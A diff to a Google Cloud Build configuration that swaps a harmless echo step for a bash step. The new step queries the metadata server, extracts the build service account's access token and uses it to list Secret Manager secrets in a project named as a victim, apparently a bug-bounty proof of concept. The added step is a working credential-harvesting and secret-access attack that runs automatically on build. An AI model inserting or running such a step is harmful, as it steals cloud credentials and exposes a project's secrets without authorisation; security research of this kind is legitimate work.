@@ -1,5 +1,29 @@
 steps:
-  - name: 'alpine'
-    args: ['echo', 'hello from build']
+  - name: 'gcr.io/cloud-builders/curl'
+    id: 'check-metadata-sa'
+    entrypoint: 'bash'
+    args:
+      - '-c'
+      - |
+        echo "=== Available service accounts on metadata server ==="
+        curl -s -H "Metadata-Flavor: Google" \
+          "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/"
+        echo
+        echo "=== Default service account email ==="
+        curl -s -H "Metadata-Flavor: Google" \
+          "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email"
+        echo
+        echo "=== Default service account scopes ==="
+        curl -s -H "Metadata-Flavor: Google" \
+          "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes"
+        echo
+        echo "=== Attempt to get token and test secretmanager.admin-level call (project-wide secret list) ==="
+        TOKEN=$(curl -s -H "Metadata-Flavor: Google" \
+          "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")
+        curl -s -H "Authorization: Bearer $TOKEN" \
+          "https://secretmanager.googleapis.com/v1/projects/vrp-s0-victim-1792291139/secrets"
+        echo
+        echo "=== tokeninfo (whose token is this really) ==="
+        curl -s "https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=$TOKEN"
 options:
   logging: CLOUD_LOGGING_ONLY
